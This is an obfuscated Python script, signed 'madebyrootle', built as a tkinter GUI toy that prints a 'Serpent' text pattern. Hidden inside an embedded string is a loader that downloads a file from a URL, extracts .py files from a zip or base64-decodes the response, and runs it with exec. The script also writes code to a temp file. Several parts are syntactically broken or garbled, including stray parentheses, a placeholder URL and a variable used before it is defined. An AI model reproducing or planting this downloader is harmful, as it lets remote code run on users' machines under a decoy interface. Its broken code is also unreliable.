import tkinter as ΤΞ; import base64 as βλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import marshal as μλ; import types as τλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import functools as ƒλ; import os as σλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import sys as ξλ; import tempfile as θλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import urllib.request as υλ; import ast as αλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
#///вихід-/reversed-/перевернутий * exec #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
бібліотеки = "".join(map(chr, [101, 120, 101, 99])) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
def кодованийB(кодованийC=20): #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    кодованийD = "" #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    for i in range(кодованийC): #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        кодованийD += "шифр" if i % 2 == 0 else "—" #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    return кодованийD #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                         #///шаблон-// #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
кодованийA = кодованийB(30) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
кодованийE = f''' #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import tkinter as ΤΞ; import base64 as βλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import marshal as μλ; import types as τλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import functools as ƒλ; import os as σλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import sys as ξλ; import tempfile as θλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import urllib.request as υλ; import ast as αλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
Функція = ( #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    lambda: type("Функція", (), {{ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        "__init__": lambda self: {бібліотеки}([ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            setattr(self, "root", ΤΞ.Tk()), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            self.root.title("{кодованийA}"), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            setattr(self, "output", (lambda: ( #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                type("OutputText", (), {{ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                    "__call__": lambda s: ΤΞ.Text( #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                        self.root, height=25, width=70, #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                        bg="black", fg="lime", #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                        insertbackground="lime", font=("Courier New", 10) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                    ) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                }})() #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            ))()), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            self.output.pack(), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            setattr(self, "vars", {{ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                "кодованийG": "//шифр//обсфукація//закодований//b64-sha256u-видалено", #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                "кодованийF": "{кодованийA}" #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            }}), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            setattr(self, "payload", (lambda: {бібліотеки}( #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                βλ.b64encode(μλ.dumps((lambda event=None: self.output.insert("end", "[ENTER]\\\\n")).__code__)).decode() #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            ))() ), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            self.кодованийI() #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        ]), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        "кодованийH": lambda self, key: self.vars.get(key, ""), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        "кодованийI": lambda self: {бібліотеки} #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            (lambda app=self: {бібліотеки}( #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                (lambda: ( #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                    type("Serpent", (), {{ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                        "__init__": lambda s, inst: {бібліотеки}(setattr(s, "pattern", self.vars["кодованийF"])),
                        "move": lambda s: {бібліотеки}( #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                            setattr(s, "pos", getattr(s, "pos", 0) + 1) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                        ), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                        "show": lambda s: {бібліотеки}( #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                            self.output.insert("end", s.pattern + "\\n") #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                        ) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                    }})() #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                ))(), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                (lambda serpent=type("Serpent", (), {{}})(): {бібліотеки}( #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                    [serpent.move(), serpent.show()] for _ in range(10) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                ) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            ))(), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            {бібліотеки}(self.бігун) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        ), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        "бігун": lambda self: {бібліотеки}( #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            self.output.insert("end", "шифр\\n") #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        ), #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        "run": lambda self: self.root.mainloop() #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    }})() #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import tkinter as ΤΞ; import base64 as βλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import marshal as μλ; import types as τλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import functools as ƒλ; import os as σλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import sys as ξλ; import tempfile as θλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import urllib.request as υλ; import ast as αλ #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
#//вихід[+]відображення="exec" #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
бібліотеки = "".join(map(chr, [101, 120, 101, 99])) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
def кодованийB(length=20): #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    кодованийC = "" #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    for i in range(length): #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        кодованийC += "шифр" if i % 2 == 0 else "—" #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    return кодованийC #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
кодованийA = кодованийB(30) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
обсфукаціяA = f''' #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import urllib.request as υλ; import base64 as βλ  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import zipfile, io  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
import os as σλ, tempfile as θλ  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
def b(c):  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    return c + '=' * (-len(c) % 4)  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
невідомийA = "base64"  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
невідомийA = b(невідомийA)  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
невідомийB = βλ.b64decode(невідомийA).decode('utf-8')  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
def невідомийC():  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    невідомийD = υλ.urlopen(невідомийB).read()  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    try:  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        with zipfile.ZipFile(io.BytesIO(невідомийD)) as z:  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            for невідомийE in z.namelist():  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                if невідомийE.endswith('.py'):  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                    exec(z.read(невідомийE))  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                    return  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    except:  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        try:  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            exec(βλ.b64decode(невідомийD).decode('utf-8'))  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
        except:  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            try:)  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                exec(невідомийD.decode('utf-8'))  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
            except:)  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
                pass)  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
невідомийC()  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
''' #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
exec(обсфукаціяA)  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
if __name__ == "__main__":  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    __невідома_програма__ = Функція()  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    __невідома_програма__.run()  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
'''  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
останній = σλ.path.join(θλ.gettempdir(), "<namescript>.py")  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
with open(останній, "w", encoding="utf-8") as f:  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
    f.write(невідомийB) #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\
print(f"!! шифр !!{останній}")  #//b64-sha256u-видалено[-/+]//[abst]//[-/+]//[thrd]\\

#!!madebyrootle$
